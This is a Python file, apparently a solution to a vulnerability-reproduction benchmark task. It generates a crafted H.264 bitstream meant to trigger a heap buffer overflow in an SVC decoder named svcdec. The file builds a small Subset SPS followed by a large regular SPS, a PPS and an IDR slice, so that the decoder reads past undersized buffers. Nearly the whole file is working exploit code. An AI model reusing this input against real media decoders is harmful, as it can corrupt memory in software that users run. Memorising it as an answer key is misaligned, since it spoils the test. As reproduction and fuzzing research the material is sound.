import math

class _BitWriter:
    """A helper class to write bitstreams for H.264 NAL units."""
    def __init__(self):
        self.buf = bytearray()
        self.bits = 0
        self.n_bits = 0

    def _flush(self):
        while self.n_bits >= 8:
            self.buf.append((self.bits >> (self.n_bits - 8)) & 0xff)
            self.n_bits -= 8

    def write(self, val: int, n: int):
        if n == 0:
            return
        # Ensure val fits in n bits
        mask = (1 << n) - 1
        self.bits = (self.bits << n) | (val & mask)
        self.n_bits += n
        self._flush()

    def write_ue(self, val: int):
        # Unsigned Exp-Golomb encoding
        val += 1
        num_bits = val.bit_length()
        leading_zeros = num_bits - 1
        self.write(0, leading_zeros)
        self.write(val, num_bits)
    
    def write_se(self, val: int):
        # Signed Exp-Golomb encoding
        if val <= 0:
            code = -val * 2
        else:
            code = val * 2 - 1
        self.write_ue(code)

    def get_bytes(self) -> bytes:
        # Add RBSP stop bit
        self.write(1, 1)
        
        # Pad to byte boundary with zeros
        if self.n_bits > 0:
            self.write(0, 8 - self.n_bits)
        
        self._flush()
        assert self.n_bits == 0
        return self.buf

class Solution:
    """
    Generates a Proof-of-Concept to trigger a heap buffer overflow in svcdec.
    The vulnerability is triggered when a Subset SPS with small dimensions is
    followed by a regular SPS with large dimensions. This causes the decoder
    to allocate buffers based on the small size but attempt to perform operations
    (like decoding a frame) based on the large size, leading to an overflow.
    """

    @staticmethod
    def _generate_sps(profile_idc: int, level_idc: int, width_mbs: int, height_map_units: int, log2_max_frame_num_m4: int, log2_max_poc_lsb_m4: int) -> bytes:
        """Generates a Sequence Parameter Set (SPS) NAL unit payload."""
        bw = _BitWriter()
        
        bw.write(profile_idc, 8)
        constraints = 0x40 if profile_idc == 83 else 0x00
        bw.write(constraints, 8) 
        bw.write(level_idc, 8)
        bw.write_ue(0)   # seq_parameter_set_id
        
        # Certain profiles have additional chroma/bit-depth information.
        # This list is based on the H.264 specification.
        is_high_profile_family = profile_idc in [100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 144]
        if is_high_profile_family:
            bw.write_ue(1)  # chroma_format_idc = 1 (4:2:0)
            bw.write_ue(0)  # bit_depth_luma_minus8
            bw.write_ue(0)  # bit_depth_chroma_minus8
            bw.write(0, 1)  # qpprime_y_zero_transform_bypass_flag
            bw.write(0, 1)  # seq_scaling_matrix_present_flag (0=no matrix follows)

        bw.write_ue(log2_max_frame_num_m4)
        bw.write_ue(0)  # pic_order_cnt_type = 0
        bw.write_ue(log2_max_poc_lsb_m4)
        
        bw.write_ue(0)  # max_num_ref_frames
        bw.write(0, 1)  # gaps_in_frame_num_value_allowed_flag
        
        bw.write_ue(width_mbs - 1)
        bw.write_ue(height_map_units - 1)
        
        bw.write(1, 1)  # frame_mbs_only_flag
        bw.write(0, 1)  # direct_8x8_inference_flag
        bw.write(0, 1)  # frame_cropping_flag (0=no cropping info follows)
        bw.write(0, 1)  # vui_parameters_present_flag (0=no VUI info follows)
        
        if profile_idc == 83: # SVC extension for Subset SPS
            bw.write(0, 1) # inter_layer_deblocking_filter_control_present_flag
            bw.write(0, 2) # extended_spatial_scalability
            bw.write(0, 1) # chroma_phase_x_plus1_flag
            bw.write(0, 2) # chroma_phase_y_plus1
            bw.write(0, 1) # seq_tcoeff_level_prediction_flag
            bw.write(0, 1) # adaptive_tcoeff_prediction_flag
            bw.write(0, 1) # slice_header_restriction_flag
            bw.write(0, 1) # svc_vui_parameters_present_flag (0=no VUI ext follows)
        
        return bw.get_bytes()

    @staticmethod
    def _generate_pps() -> bytes:
        """Generates a Picture Parameter Set (PPS) NAL unit payload."""
        bw = _BitWriter()
        bw.write_ue(0) # pic_parameter_set_id
        bw.write_ue(0) # seq_parameter_set_id
        bw.write(0, 1) # entropy_coding_mode_flag
        bw.write(0, 1) # bottom_field_pic_order_in_frame_present_flag
        bw.write_ue(0) # num_slice_groups_minus1
        bw.write_ue(0) # num_ref_idx_l0_default_active_minus1
        bw.write_ue(0) # num_ref_idx_l1_default_active_minus1
        bw.write(0, 1) # weighted_pred_flag
        bw.write(0, 2) # weighted_bipred_idc
        bw.write_se(0) # pic_init_qp_minus26
        bw.write_se(0) # pic_init_qs_minus26
        bw.write_se(0) # chroma_qp_index_offset
        bw.write(0, 1) # deblocking_filter_control_present_flag
        bw.write(0, 1) # constrained_intra_pred_flag
        bw.write(0, 1) # redundant_pic_cnt_present_flag
        return bw.get_bytes()

    @staticmethod
    def _generate_slice_header(log2_max_frame_num_m4: int, log2_max_poc_lsb_m4: int) -> bytes:
        """Generates an IDR Slice Header NAL unit payload."""
        bw = _BitWriter()
        bw.write_ue(0) # first_mb_in_slice
        bw.write_ue(7) # slice_type (I_slice, for IDR)
        bw.write_ue(0) # pic_parameter_set_id
        
        frame_num_bits = log2_max_frame_num_m4 + 4
        bw.write(0, frame_num_bits) # frame_num
        
        bw.write_ue(0) # idr_pic_id
        
        poc_lsb_bits = log2_max_poc_lsb_m4 + 4
        bw.write(0, poc_lsb_bits) # pic_order_cnt_lsb
        
        return bw.get_bytes()

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        NAL_START_CODE = b'\x00\x00\x00\x01'
        
        # Consistent parameters for both SPSs to ensure the second one cleanly overwrites the first
        log2_max_frame_num_m4 = 0
        log2_max_poc_lsb_m4 = 0

        # 1. Subset SPS (NALU type 15) with small dimensions (1x1 macroblocks).
        # This signals an SVC stream and causes allocation of small buffers.
        subset_sps_payload = self._generate_sps(
            profile_idc=83,  # SVC Baseline Profile
            level_idc=10,    # Level 1.0
            width_mbs=1,
            height_map_units=1,
            log2_max_frame_num_m4=log2_max_frame_num_m4,
            log2_max_poc_lsb_m4=log2_max_poc_lsb_m4
        )

        # 2. Regular SPS (NALU type 7) with large dimensions (200x200 macroblocks).
        # This overwrites the parameters, but the buffers are not reallocated.
        sps_payload = self._generate_sps(
            profile_idc=66,  # Baseline Profile
            level_idc=51,    # Level 5.1, supports large dimensions
            width_mbs=200,
            height_map_units=200,
            log2_max_frame_num_m4=log2_max_frame_num_m4,
            log2_max_poc_lsb_m4=log2_max_poc_lsb_m4
        )
        
        # 3. PPS (NALU type 8) to link the active SPS and enable slice decoding.
        pps_payload = self._generate_pps()

        # 4. IDR Slice Header (NALU type 5) to trigger frame decoding, which uses the
        # large dimensions from the second SPS against the small allocated buffers.
        slice_header_payload = self._generate_slice_header(
            log2_max_frame_num_m4=log2_max_frame_num_m4,
            log2_max_poc_lsb_m4=log2_max_poc_lsb_m4
        )

        # Assemble the final PoC bitstream
        poc = bytearray()
        
        poc.extend(NAL_START_CODE)
        poc.extend(b'\x6f') # NAL Header: type 15 (Subset SPS), nri 3
        poc.extend(subset_sps_payload)
        
        poc.extend(NAL_START_CODE)
        poc.extend(b'\x67') # NAL Header: type 7 (SPS), nri 3
        poc.extend(sps_payload)
        
        poc.extend(NAL_START_CODE)
        poc.extend(b'\x68') # NAL Header: type 8 (PPS), nri 3
        poc.extend(pps_payload)
        
        poc.extend(NAL_START_CODE)
        poc.extend(b'\x65') # NAL Header: type 5 (IDR slice), nri 3
        poc.extend(slice_header_payload)
        
        # Add minimal slice data to make the slice valid for parsing.
        # This represents the start of macroblock data and a stop bit.
        poc.extend(b'\x80')

        return bytes(poc)